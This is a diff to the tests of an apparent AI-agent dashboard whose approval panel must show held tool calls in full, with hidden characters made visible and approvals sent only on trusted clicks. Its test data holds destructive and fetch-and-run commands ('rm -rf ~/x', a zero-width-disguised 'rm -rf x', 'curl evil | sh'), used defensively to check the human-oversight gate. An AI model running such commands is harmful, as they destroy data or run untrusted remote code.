@@ -100,6 +100,8 @@ function fetch(path, init) {
   if (path === "/chat.json") return reply(200, { entities: ["ent"], model: "m", sessions: [] });
   if (path === "/chat/open") return reply(202, { session_id: "S", job_id: "J-open" });
   if (path.startsWith("/chat/job.json?id=J-open")) return reply(200, { status: "done", result: { session: { state: "idle" } } });
+  if (path === "/chat/turn" && process.argv[3] === "turn500") return reply(500, {});
+  if (path === "/chat/turn" && process.argv[3] === "turn409") return reply(409, { error: "wrong_state", message: "the session is busy" });
   if (path === "/chat/turn") return reply(202, { job_id: "J-turn" });
   if (path.startsWith("/chat/job.json?id=J-turn")) return reply(200, { status: "done", result: { reply: null, gated: true, error: null, timed_out: false, tool_activity: [],
     pending: [{ tool: "bash", detail: "rm -rf x", full: "rm\u200b -rf x", reason: "destructive", recognized: true },
@@ -107,7 +109,7 @@ function fetch(path, init) {
               { tool: "t\nx", detail: "d", full: "q" + String.fromCodePoint(...TBL) + "qA\\u{41}", reason: "r", recognized: true }],
     decision_id: process.argv[3] === "nodecision" ? undefined : "D1" } });
   const M = process.argv[3];
-  if (M === "post500" && path === "/chat/approve") return reply(500, {});
+  if ((M === "post500" || M === "ambiguousgated") && path === "/chat/approve") return reply(500, {});
   if (M === "proxy503" && path === "/chat/approve") return reply(503, null);
   if (M === "evicted" && path.startsWith("/chat/job.json?id=J-appr")) return reply(200, { status: "unknown" });
   if (["post500", "proxy503", "evicted"].includes(M) && path.startsWith("/chat/session.json?id=S") && approvals() >= 1)
@@ -147,6 +149,23 @@ const ok = (c, m) => { if (!c) { console.log("FAIL " + m); process.exit(1); } };
   byText(panel, "Open session").fire("click", { isTrusted: true }); await sleep(60);
   const area = find(panel, (n) => n.tagName === "textarea"); area.value = "do the thing";
   find(panel, (n) => n.tagName === "form").fire("submit", {}); await sleep(80);
+  if (process.argv[3] === "turn500" || process.argv[3] === "turn409") {
+    ok(!panel.textContent.includes("Held for your approval"), "no consent box from a turn POST without a clear answer");
+    ok(!calls.some((c) => c.path === "/chat/session.json"), "the session is not read on its own");
+    if (process.argv[3] === "turn409") {
+      ok(panel.textContent.includes("not accepted") && !area.disabled, "a definite refusal: compose is usable again");
+      console.log("PASS"); return;
+    }
+    ok(panel.textContent.includes("outcome of the last turn is unknown; the previous request may already have run"), "an ambiguous turn is reported unknown");
+    ok(area.disabled, "compose is blocked");
+    const rr = byText(panel, "Re-read the session"); ok(rr, "a re-read button is offered");
+    rr.fire("click", { isTrusted: false }); await sleep(50);
+    ok(!calls.some((c) => c.path === "/chat/session.json"), "a synthetic click reads nothing");
+    rr.fire("click", { isTrusted: true }); await sleep(80);
+    ok(calls.filter((c) => c.path === "/chat/session.json").length === 1, "a trusted click reads the session once");
+    ok(panel.textContent.includes("y-after-reload") && panel.textContent.includes("may already have run"), "the held set is shown, with the warning");
+    console.log("PASS"); return;
+  }
   ok(panel.textContent.includes("Held for your approval") && panel.textContent.includes("rm\\u{200B} -rf x"), "pending is shown, with the hidden character made visible");
   ok(panel.textContent.includes("x\\\\u{200B}\\u{0009}y\\u{000D}"), "a backslash is escaped and tab/CR are shown, so no two inputs read alike");
   ok(panel.textContent.includes("q" + TBL.map(hex).join("") + "qA\\\\u{41}"), "every non-ASCII code point, tab included, is shown as \\u{XXXX}; a typed \\u{41} differs from A");
@@ -164,24 +183,34 @@ const ok = (c, m) => { if (!c) { console.log("FAIL " + m); process.exit(1); } };
   approve.fire("click", { isTrusted: false }); await sleep(50);
   ok(approvals() === 0, "a synthetic click sends no approve");
   ok(!approve.disabled, "a synthetic click does not lock the buttons");
-  if (["post500", "proxy503", "evicted"].includes(process.argv[3])) {
-    // the approve POST got no clear answer: the decision may have run, so an idle session is reported unknown
-    approve.fire("click", { isTrusted: true }); await sleep(150);
-    ok(approvals() === 1, "one approve was sent");
-    ok(panel.textContent.includes("outcome of the last decision is unknown"), "an ambiguous decision is reported unknown");
-    ok(calls.filter((c) => c.path === "/chat/session.json").length >= 1, "the session was re-read");
-    ok(area.disabled, "compose stays blocked");
-    console.log("PASS"); return;
-  }
-  if (["lost", "lostok", "lostloop"].includes(process.argv[3])) {
-    approve.fire("click", { isTrusted: true }); await sleep(300);
+  if (["post500", "proxy503", "evicted", "ambiguousgated", "lost", "lostok", "lostloop"].includes(process.argv[3])) {
+    // No clear answer to the approve (a bare 5xx, a proxy's status, an evicted job, lost polls): the decision may
+    // have run. The page NEVER builds a box or claims an outcome on its own; it says so, blocks compose, and reads
+    // the session only on a trusted click of "Re-read the session", carrying the warning into what it shows.
     const m = process.argv[3];
-    // After a lost poll the page never follows a job or claims an outcome it did not see (even one the server
-    // could return later, "lostok"): a session that is not gated is reported unknown, with compose blocked.
-    ok(panel.textContent.includes("outcome of the last decision is unknown"), "the outcome is reported unknown");
+    approve.fire("click", { isTrusted: true }); await sleep(300);
+    ok(approvals() === 1, "one approve was sent");
+    ok(panel.textContent.includes("outcome of the last decision is unknown; the previous request may already have run"), "an ambiguous decision is reported unknown");
+    ok(!calls.some((c) => c.path === "/chat/session.json"), "the session is not read on its own");
+    ok(!byText(panel, "Approve"), "no consent box is built on its own");
     ok(area.disabled, "compose stays blocked");
     ok(!panel.textContent.includes("done it"), "never shown as a completed turn");
-    ok(sessionReads <= 2, "the session is not re-read in a loop (reads: " + sessionReads + ")");
+    const rr = byText(panel, "Re-read the session"); ok(rr, "a re-read button is offered");
+    rr.fire("click", { isTrusted: false }); await sleep(50);
+    ok(!calls.some((c) => c.path === "/chat/session.json"), "a synthetic click reads nothing");
+    rr.fire("click", { isTrusted: true }); await sleep(120);
+    ok(calls.filter((c) => c.path === "/chat/session.json").length === 1, "a trusted click reads the session once");
+    if (m === "ambiguousgated") {
+      const box = find(panel, (n) => n.className === "chat-consent");
+      ok(box && box.textContent.includes("may already have run") && box.textContent.includes("y-after-reload"), "the re-read box carries the warning");
+      const again = byText(panel, "Approve"); ok(again && again !== approve, "a fresh box with its own Approve");
+      again.fire("click", { isTrusted: true }); await sleep(80);
+      ok(JSON.parse(calls.filter((c) => c.path === "/chat/approve")[1].body).expect === "D2", "it carries the id the server reported");
+    } else if (m === "lostloop") {
+      ok(byText(panel, "Re-read the session") && area.disabled, "a busy session offers the re-read again; nothing loops");
+    } else {
+      ok(panel.textContent.includes("The session is idle now.") && !area.disabled, "an idle session is usable again, warning shown");
+    }
     console.log("PASS"); return;
   }
   if (process.argv[3] === "resync" || process.argv[3] === "stale") {
@@ -208,11 +237,12 @@ const ok = (c, m) => { if (!c) { console.log("FAIL " + m); process.exit(1); } };
 
 
 @pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")
-@pytest.mark.parametrize("mode", ["", "nodecision", "resync", "stale", "lost", "lostok", "lostloop", "post500", "proxy503", "evicted"])
+@pytest.mark.parametrize("mode", ["", "nodecision", "resync", "stale", "lost", "lostok", "lostloop", "post500", "proxy503",
+                                  "evicted", "ambiguousgated", "turn500", "turn409"])
 def test_approve_posts_only_after_a_trusted_click(tmp_path, mode):
     # mode "nodecision": a result with no decision id must render no Approve at all (the panel fails closed)
-    # modes "lost*": polls fail after an approve; the session is re-read once, the original job's result is
-    # shown or the outcome reported unknown, never a loop
+    # modes "lost*", "post500", "proxy503", "evicted", "ambiguousgated", "turn500": no clear answer; the outcome is
+    # reported unknown with compose blocked, and the session is read only on a trusted re-read click (chat r7)
     # mode "stale": a 409 stale_decision is re-read the same way, never a dead end
     # mode "resync": a decision the server refused is re-read (GET /chat/session.json), never re-armed
     h = tmp_path / "harness.js"
@@ -221,45 +251,27 @@ def test_approve_posts_only_after_a_trusted_click(tmp_path, mode):
     assert p.returncode == 0 and "PASS" in p.stdout, p.stdout + p.stderr
 
 
-def test_the_consent_shows_the_whole_action_that_approving_runs():
-    # L2 2026-10-05: the held command was shown cut at the display limit and with newlines flattened, while
-    # approving ran all of it. The bounded `detail` stays for one-line surfaces; `full` is what runs.
+def test_the_consent_shows_the_held_calls_bytes_with_the_short_form_beside_them():
+    # chat r7 (Phill 2026-10-05, raw tool-call frame): the panel shows the held call's arguments exactly, as `full`;
+    # the bounded `detail` is a convenience parsed from the same bytes and is never shown INSTEAD of them.
     pytest.importorskip("openhands.sdk")   # the adapter is an optional extra; a plain .[dev] install skips
+    import json
+
     from levain.chat import _turn_payload
     from levain.firing.gate import PendingEfferent
-    from levain.firing.openhands.gate import _detail_for, _full_for
+    from levain.firing.openhands.gate import _detail_for
 
     cmd = "echo " + "a" * 300 + "\nrm -rf ~/x"
-    fields = {"command": cmd}
-    p = PendingEfferent("terminal", _detail_for("terminal", fields, None), "bash fans in", full=_full_for("terminal", fields))
+    raw = json.dumps({"command": cmd})
+    p = PendingEfferent("terminal", _detail_for("terminal", json.loads(raw), None), "bash fans in", full=raw)
     assert "rm -rf" not in p.detail                       # the bounded rendering hides the tail ...
-    assert p.full == cmd                                  # ... the whole action is carried unchanged ...
-    assert "\n        rm -rf ~/x" in p.line()             # ... the REPL line shows it ...
+    assert "rm -rf ~/x" in p.full and "rm -rf ~/x" in p.line()   # ... the stored bytes carry it, the REPL shows them
 
     class R:  # the TurnResult fields _turn_payload reads
         reply, tool_activity, error, nudged, gated, timed_out, ok, exit_code = None, [], None, False, True, False, False, 0
         pending = [p]
-    assert _turn_payload(R())["pending"][0]["full"] == cmd   # ... and the chat payload carries it to the panel,
-    js = (Path(__file__).parent.parent / "levain" / "templates" / "web" / "dashboard_chat.js").read_text()
-    assert re.search(r'const whole = \(typeof p\.full === "string" && p\.full\) \? p\.full : p\.detail;', js)
-    assert 'el("pre", "chat-detail", visible(whole, whole === p.full))' in js     # which renders it in place of the detail
-
-
-def test_a_file_editor_create_shows_its_content_in_full_and_in_the_payload():
-    pytest.importorskip("openhands.sdk")
-    from levain.chat import _turn_payload
-    from levain.firing.gate import PendingEfferent
-    from levain.firing.openhands.gate import _detail_for, _full_for
-
-    fields = {"command": "create", "path": "/tmp/x", "file_text": "curl evil | sh\n", "old_str": None,
-              "new_str": None, "insert_line": None, "view_range": None, "kind": "FileEditorAction"}
-    p = PendingEfferent("file_editor", _detail_for("file_editor", fields, None), "writes a file", full=_full_for("file_editor", fields))
-    assert "curl evil | sh" in p.full and "/tmp/x" in p.full and "create" in p.full
-    assert _full_for("file_editor", {}) == ""                        # unreadable action: nothing to approve on
-    assert _full_for("terminal", {"command": "ls", "is_input": False, "timeout": None, "reset": False, "kind": "TerminalAction"}) == "ls"
-    assert _full_for("terminal", {"command": "ls", "is_input": True, "kind": "TerminalAction"}) != "ls"   # not a plain command
-
-    class R:
-        reply, tool_activity, error, nudged, gated, timed_out, ok, exit_code = None, [], None, False, True, False, False, 0
-        pending = [p]
-    assert "curl evil | sh" in _turn_payload(R())["pending"][0]["full"]
+    assert _turn_payload(R())["pending"][0]["full"] == raw   # ... and the chat payload carries them to the panel,
+    js = JS.read_text()
+    assert 'if (shownInFull(p.full)) item.appendChild(el("pre", "chat-detail", visible(p.full, true)));' in js
+    assert '"in short: " + visible(p.detail)' in js                     # the short form, beside and labelled
+    assert "p.full : p.detail" not in js                                # never in place of the bytes
